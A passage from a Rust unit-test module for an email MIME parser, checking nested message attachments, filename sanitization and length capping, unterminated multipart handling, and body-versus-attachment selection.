             Content-Type: text/plain\n\
             \n\
             inner body\n\
             --m--\n",
        );
        let parsed = parse_message(&raw);
        assert_eq!(parsed.text.as_deref(), Some("outer"));
        assert_eq!(parsed.attachments.len(), 1);
        let attachment = &parsed.attachments[0];
        assert_eq!(attachment.part, "1.2");
        assert_eq!(attachment.content_type, "message/rfc822");
        assert!(attachment
            .bytes
            .windows(b"inner body".len())
            .any(|window| window == b"inner body"));
    }

    #[test]
    fn attachment_filename_strips_controls_and_caps_length() {
        let long_name = format!("{}\t.txt", "a".repeat(300));
        let raw = message(&format!(
            "Content-Type: multipart/mixed; boundary=x\n\
             \n\
             --x\n\
             Content-Type: text/plain\n\
             \n\
             body\n\
             --x\n\
             Content-Type: application/octet-stream\n\
             Content-Disposition: attachment; filename=\"{long_name}\"\n\
             \n\
             data\n\
             --x--\n"
        ));
        let parsed = parse_message(&raw);
        let filename = parsed.attachments[0]
            .filename
            .as_deref()
            .unwrap_or_default();
        assert!(!filename.contains('\t'));
        assert_eq!(filename.chars().count(), MAX_FILENAME_CHARS);
    }

    #[test]
    fn unterminated_multipart_still_yields_the_final_part() {
        let raw = message(
            "Content-Type: multipart/mixed; boundary=z\n\
             \n\
             --z\n\
             Content-Type: text/plain\n\
             \n\
             tail body",
        );
        let parsed = parse_message(&raw);
        assert_eq!(parsed.text.as_deref(), Some("tail body"));
    }

    #[test]
    fn text_attachment_is_not_used_as_body() {
        let raw = message(
            "Content-Type: multipart/mixed; boundary=b\n\
             \n\
             --b\n\
             Content-Type: text/plain; name=\"notes.txt\"\n\
             Content-Disposition: inline; filename=\"notes.txt\"\n\
             \n\
             attachment text\n\
             --b\n\
             Content-Type: text/plain\n\
             \n\
             real body\n\
             --b--\n",
        );
        let parsed = parse_message(&raw);
        assert_eq!(parsed.text.as_deref(), Some("real body"));
        assert_eq!(parsed.attachments.len(), 1);
        assert_eq!(parsed.attachments[0].part, "1.1");
        assert_eq!(parsed.attachments[0].filename.as_deref(), Some("notes.txt"));
    }
}
